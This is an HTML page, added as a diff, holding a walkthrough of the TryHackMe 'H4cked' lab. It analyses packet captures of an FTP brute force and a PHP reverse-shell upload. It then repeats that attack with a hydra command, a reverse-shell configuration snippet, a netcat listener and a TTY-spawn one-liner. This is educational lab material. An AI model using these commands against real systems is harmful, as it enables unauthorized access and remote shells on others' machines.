@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="H4cked - TryHackMe Room walkthrough [H4cked]https://tryhackme.com/room/h4cked is a beginner room from TryHackMe. We’ll have to apply offensive and defensive concepts to complete the room.
+Oh no! We&rsquo;ve been hacked! We begin by reading that some intruder has found his way into one of our machines, and the .pcapng is our forensic evidence.
+We can start by opening the file in Wireshark to analyze its content. Immediately, we see that the attacker has tried, successfully, to brute force our host through the FTP service on port 21:">  
+
+  <title>
+    
+      H4cked writeup
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.c5af9bae99b4a3d315b9f39305ffff27e9c3383fbbfd8b5fcaf2237667021a333a982fb958d1813a720b0a660b14022337553ae1ca93ef2ee17c4ae628ac19cb.css" integrity="sha512-xa&#43;brpm0o9MVufOTBf//J&#43;nDOD&#43;7/YtfyvIjdmcCGjM6mC&#43;5WNGBOnILCmYLFAIjN1U64cqT7y7hfErmKKwZyw==" />
+  
+</head>
+<body a="auto">
+        <main class="page-content" aria-label="Content">
+            <div class="w">
+<a href="/">..</a>
+
+
+<article>
+    <p class="post-meta">
+        <time datetime="2021-10-19 12:43:22 &#43;0100 &#43;0100">
+            2021-10-19
+        </time>
+    </p>
+
+    <h1>H4cked writeup</h1>
+
+    
+        <aside >
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#oh-no-weve-been-hacked">Oh no! We&rsquo;ve been hacked!</a>
+      <ul>
+        <li><a href="#reverse-shell-execution">Reverse shell execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#hack-back">Hack back</a></li>
+  </ul>
+</nav>
+        </aside>
+    
+
+    <h1 id="h4cked---tryhackme-room-walkthrough">H4cked - TryHackMe Room walkthrough</h1>
+<p><em><strong>[H4cked]https://tryhackme.com/room/h4cked</strong></em> is a beginner room from TryHackMe. We’ll have to apply offensive and defensive concepts to complete the room.</p>
+<h2 id="oh-no-weve-been-hacked">Oh no! We&rsquo;ve been hacked!</h2>
+<p>We begin by reading that some intruder has found his way into one of our machines, and the <em>.pcapng</em> is our forensic evidence.</p>
+<p>We can start by opening the file in Wireshark to analyze its content. Immediately, we see that the attacker has tried, successfully, to brute force our host through the FTP service on port 21:</p>
+<p><img src="/img/hacked/Untitled.png" alt="Untitled.png"></p>
+<p>He&rsquo;s specifically targeting the user &ldquo;jenny&rdquo;</p>
+<p><img src="/img/hacked/Untitled%201.png" alt="Untitled%201.png"></p>
+<p>Trying to brute-force the login password.</p>
+<p>![Untitled%202.png]</p>
+<p>Here, he finally succeeded:</p>
+<p><img src="/img/hacked/Untitled%203.png" alt="Untitled"></p>
+<p>Following the consequent TCP stream, we have:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#ae81ff">220</span> <span style="color:#a6e22e">Hello</span> <span style="color:#a6e22e">FTP</span> <span style="color:#a6e22e">World</span><span style="color:#f92672">!</span>
+<span style="color:#a6e22e">USER</span> <span style="color:#a6e22e">jenny</span>
+<span style="color:#ae81ff">331</span> <span style="color:#a6e22e">Please</span> <span style="color:#a6e22e">specify</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">password</span>.
+<span style="color:#a6e22e">PASS</span> <span style="color:#a6e22e">password123</span>
+<span style="color:#ae81ff">230</span> <span style="color:#a6e22e">Login</span> <span style="color:#a6e22e">successful</span>.
+<span style="color:#a6e22e">SYST</span>
+<span style="color:#ae81ff">215</span> <span style="color:#a6e22e">UNIX</span> <span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">L8</span>
+<span style="color:#a6e22e">PWD</span>
+<span style="color:#ae81ff">257</span> <span style="color:#e6db74">&#34;/var/www/html&#34;</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">current</span> <span style="color:#a6e22e">directory</span>
+<span style="color:#a6e22e">PORT</span> <span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">168</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">147</span>,<span style="color:#ae81ff">225</span>,<span style="color:#ae81ff">49</span>
+<span style="color:#ae81ff">200</span> <span style="color:#a6e22e">PORT</span> <span style="color:#a6e22e">command</span> <span style="color:#a6e22e">successful</span>. <span style="color:#a6e22e">Consider</span> <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">PASV</span>.
+<span style="color:#a6e22e">LIST</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">la</span>
+<span style="color:#ae81ff">150</span> <span style="color:#a6e22e">Here</span> <span style="color:#a6e22e">comes</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">directory</span> <span style="color:#a6e22e">listing</span>.
+<span style="color:#ae81ff">226</span> <span style="color:#a6e22e">Directory</span> <span style="color:#a6e22e">send</span> <span style="color:#a6e22e">OK</span>.
+<span style="color:#a6e22e">TYPE</span> <span style="color:#a6e22e">I</span>
+<span style="color:#ae81ff">200</span> <span style="color:#a6e22e">Switching</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Binary</span> <span style="color:#a6e22e">mode</span>.
+<span style="color:#a6e22e">PORT</span> <span style="color:#ae81ff">192</span>,<span style="color:#ae81ff">168</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">147</span>,<span style="color:#ae81ff">196</span>,<span style="color:#ae81ff">163</span>
+<span style="color:#ae81ff">200</span> <span style="color:#a6e22e">PORT</span> <span style="color:#a6e22e">command</span> <span style="color:#a6e22e">successful</span>. <span style="color:#a6e22e">Consider</span> <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">PASV</span>.
+<span style="color:#a6e22e">STOR</span> <span style="color:#a6e22e">shell</span>.<span style="color:#a6e22e">php</span>
+<span style="color:#ae81ff">150</span> <span style="color:#a6e22e">Ok</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">send</span> <span style="color:#a6e22e">data</span>.
+<span style="color:#ae81ff">226</span> <span style="color:#a6e22e">Transfer</span> <span style="color:#a6e22e">complete</span>.
+<span style="color:#a6e22e">SITE</span> <span style="color:#a6e22e">CHMOD</span> <span style="color:#ae81ff">777</span> <span style="color:#a6e22e">shell</span>.<span style="color:#a6e22e">php</span>
+<span style="color:#ae81ff">200</span> <span style="color:#a6e22e">SITE</span> <span style="color:#a6e22e">CHMOD</span> <span style="color:#a6e22e">command</span> <span style="color:#a6e22e">ok</span>.
+<span style="color:#a6e22e">QUIT</span>
+<span style="color:#ae81ff">221</span> <span style="color:#a6e22e">Goodbye</span>.
+</code></pre></div><p>From which we can obtain some useful info:</p>
+<ul>
+<li>the current FTP working directory: <code>/var/www/html</code>;</li>
+<li>the name of the file uploaded: <code>shell.php</code>.</li>
+</ul>
+<p>From the <code>FTP-DATA</code> packet, we can see the complete file in clear. We learn that a PHP script executes reverse shell; here we have the entire program: <a href="http://pentestmonkey.net/tools/php-reverse-shell">http://pentestmonkey.net/tools/php-reverse-shell</a>.</p>
+<h3 id="reverse-shell-execution">Reverse shell execution</h3>
+<p>Even though it doesn&rsquo;t makes us proceed any further in the room it is worth noting that looking at the script we can see that the port and the ip address of the attacker are hard coded.</p>
+<p>Continuing with our analysis of the packets, we can see that the attacker closed the FTP connection and proceed to request <code>shell.php</code> through an HTTP request. This will execute the PHP file, granting the attacker access to our machine.</p>
+<p><img src="/img/hacked/Untitled%204.png" alt="Untitled%204.png"></p>
+<p>All the communication proceeds on a TCP unencrypted channel; consequently, we can read all the commands and responses in-clear.</p>
+<p><img src="/img/hacked/Untitled%205.png" alt="Untitled"></p>
+<p>Following the TCP stream, we can see:</p>
+<ul>
+<li>the first command executed by the attacker after getting a reverse shell: <code>whoami</code></li>
+<li>the computer hostname: <em><strong>wir3</strong></em></li>
+<li>the command the attacker used to spawn a new TTY shell:
+<code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></li>
+</ul>
+<p>Then, after getting root privileges through the command <code>sudo su</code>, the attacker downloaded <strong><a href="https://github.com/f0rb1dd3n/Reptile">Reptile</a></strong>, a Linux rootkit. This rootkit grants stealth access to the computer, hiding TCP/UDP connections and hidden boot persistence.</p>
+<h2 id="hack-back">Hack back</h2>
+<p>Now is the time to get back our machine.</p>
+<p>Our first preoccupation is to regain access to the machine. Given that the attacker has changed the user&rsquo;s password, we can try to replicate his attack, hoping he has chosen a simple password. Our go-to for this kind of operation is Hydra, a login cracker. Luckily, it was sufficient to use the built-in word-list &ldquo;rock-you&rdquo; to guess the password in a matter of seconds:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://MACHINE.IP
+</code></pre></div><p>Now that we have FTP access, it is time to use the same strategy as the attacker:</p>
+<ol>
+<li>Change the reverse shell script with our IP and port.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">set_time_limit</span> (<span style="color:#ae81ff">0</span>);
+$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
+$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>;  <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1234</span>;       <span style="color:#75715e">// CHANGE THIS
+</span><span style="color:#75715e"></span>$chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1400</span>;
+$write_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$error_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; /bin/sh -i&#39;</span>;
+$daemon <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+$debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</code></pre></div><ol start="2">
+<li>Upload the modified version to the machine, replacing the existing one.</li>
+<li>Run a listener on our machine with netcat</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc –nlvp <span style="color:#ae81ff">1234</span>
+</code></pre></div><ol start="4">
+<li>Execute the web shell by visiting the .php file at <code>http://&lt;machineIP&gt;/shell.php</code> with our browser.</li>
+</ol>
+<p>We&rsquo;ll see a shell where we run <code>netcat</code> command. Since it is not a complete shell we have to:</p>
+<ol start="5">
+<li>spawn a tty shell by using the Python script:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span style="color:#e6db74">`</span>
+</code></pre></div><p>Now we have a complete shell, but is not over yet. The user executing the shell process is <code>www-data</code>. Since it doesn&rsquo;t have root access, we must perform some priviledge escalation.</p>
+<p>As we learned before, jenny has root access, and we have seen her password looking at the HTTP captured packets. Thus, we can switch the user with the <code>su</code>, and then get sudo with <code>sudo su</code>.</p>
+<p>Finally, it is just a matter of printing the flag inside the Reptile directory at &ldquo;/root/Reptile/flag.txt&rdquo;.</p>
+
+</article>
+
+            </div>
+        </main>
+    </body></html>
